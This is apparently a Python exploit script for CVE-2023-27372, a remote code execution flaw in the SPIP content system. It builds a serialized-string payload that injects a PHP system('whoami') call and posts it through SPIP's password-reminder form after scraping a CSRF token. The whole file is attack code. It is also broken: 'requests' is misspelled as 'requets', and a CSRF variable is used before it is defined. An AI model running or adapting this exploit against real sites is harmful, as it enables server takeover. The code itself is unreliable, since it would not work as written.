 #!/bin/bash env python3

import requests
import bs4
import sys
from bs4 import BeautifulSoup  
from colorama import Fore, Style

requests.packages.urllib3.disable_warnings()


def style():

      text='''
          CVE-2023-27372
        Remote Code Execution
          Rewrite by Jhonson
         
       '''
     
      print(Fore.RED+ Style.BRIGHT +text+ Style.RESET_ALL)



def main(url, directory,data,payload):
    r=requets.get(f'{url}/{directory}', verify=False, timeout=10).text
    soup = bs4.BeautifulSoup(r, 'html.parser')
    csrf = soup.find('input', {'name': 'formulaire_action_args'})
    if csrf:
        csrf_value = csrf['value']
        r=requets.post(f'{url}/{directory}',data=data, verify=False, timeout=10).text
        soup1 = bs4.BeautifulSoup(r, 'html.parser')
        csrf1 = soup1.find_all('input')
        cs = str(list(csrf1)[3])
        print("\033[1;32m"+cs)

   
   
if __name__=='__main__':
         
          payload="s:%s:\"<?php system('%s'); ?>\";" % (20 + len('whoami'), 'whoami')


          data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf_value,
        "oubli": payload}
          style()
          main(sys.argv[1],'/spip.php?page=spip_pass',data,payload)
                                                                                                                                                                       

